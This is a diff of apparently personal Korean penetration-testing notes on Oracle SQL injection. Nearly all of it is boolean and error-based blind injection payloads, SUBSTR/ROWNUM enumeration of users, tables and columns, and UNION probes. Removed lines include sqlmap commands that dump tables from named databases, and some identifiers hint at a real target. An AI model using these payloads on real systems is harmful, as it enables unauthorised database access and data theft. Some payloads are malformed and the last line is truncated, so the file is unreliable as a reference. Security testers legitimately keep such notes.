@@ -1,9 +1,5 @@
 ###SQL INJECTION
 
-https://iron-security.tistory.com/5 (인크루더 사용법)
-https://jini23-lamp.tistory.com/entry/PathDirectory-Traversal
- (파일 다운로드)
-
 ##참거짓
 , (case when 1=1 then 1 else 1/0 end) desc
 , (case when 1=0 then 1 else 1/0 end) desc
@@ -102,14 +98,6 @@ X0145765' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name= 'DUAL')=1 
 컬럼 내 데이터 갯수
 X0145765' AND (SELECT COUNT(DUMMY) FROM DUAL)=1 --
 
-1.SQL 인젝션
-2.파일업로드
-3.불충분한 인가
-4.정보누출
-
-SYSTEM
-
-
 3번째 DB 이름
 X0145765' AND SUBSTR((SELECT username FROM (SELECT ROWNUM rnum, username FROM all_users) WHERE rnum = 3), 5, 1)='E' --
 
@@ -132,11 +120,17 @@ HELP 1열 컬럼 이름
 X0145765' AND SUBSTR((SELECT column_name FROM all_tab_columns WHERE table_name = 'HELP' AND ROWNUM=1),1, 1)= 'A' --
 
 
-python sqlmap.py -r TEST.txt -D XDB database  --tables --random-agent --proxy=http://127.0.0.1:8080 --force-ssl -v 3
-
-
-python sqlmap.py -r TEST.txt -D DEXADM -T COM_DATA_VIEW_MAS --random-agent --proxy=http://127.0.0.1:8080 --force-ssl -v 3 --dump
-
-PC1604886
-
 ,(select+case+when+ascii(substr((select+user+from+dual+where+rownum=1),1,1))<65+then+(select+1+from+dual)+else+1/0+end+from+dual)
+',(SELECT+(CASE+WHEN+(1=1)+THEN+1+1ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL) 
+(case when 1=1 then 1 else 1/0 end) 
+and(select count(*) from product_component_version where version_full like '%{버전}%')=1 -- -" 
+',(SELECT+(CASE+WHEN+(1=1)+THEN+1+ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL 
+',(SELECT+(CASE+WHEN+(1=2)+THEN+1+ELSE+CAST(1+AS+INT)/0+END)+FROM+DUAL 
+,(case when ascii(substr('abc', 1, 1)) > 84 then 1 else 1/0 end) desc 
+'||(case+when+1=1+then+1+else+1/0+end) 
+17.SmartPIM 
+'+AND+'1%'='1 
+'+UNION+ALL_SELECT+NULL,생략+FROM+(SELECT+DISTINCT(OWNER)+FROM+SYS,ALL_TABLES)--+SQL 
+'+AND+1=1+AND+'1'='1 
++UNION+ALL_SELECT+NULL,(SELECT+@@version),NULL, 생략 -- 
+"('1') AND (SELECT COUNT(table_name)
